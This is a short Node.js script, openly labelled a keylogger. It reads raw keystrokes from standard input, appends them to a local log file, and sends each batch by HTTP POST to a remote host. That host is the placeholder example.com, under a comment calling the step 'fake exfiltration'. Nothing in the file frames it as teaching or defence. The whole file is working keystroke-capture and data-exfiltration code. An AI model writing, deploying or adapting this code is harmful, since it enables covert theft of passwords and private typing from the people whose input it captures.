const http = require("http");
const os = require("os");
const fs = require("fs");

let buffer = [];

// Collect keystrokes
process.stdin.setRawMode(true);
process.stdin.on("data", function(data) {
    let key = data.toString();
    buffer.push(key);
    if (buffer.length > 10) {
        flushBuffer();
    }
});

function flushBuffer() {
    let data = buffer.join("");
    fs.writeFileSync("keystrokes.log", data, { flag: "a" });
    buffer = [];

    // Fake exfiltration
    const options = {
        hostname: "example.com",
        port: 8080,
        path: "/upload",
        method: "POST"
    };

    const req = http.request(options);
    req.write(data);
    req.end();
}

console.log("Keylogger started");
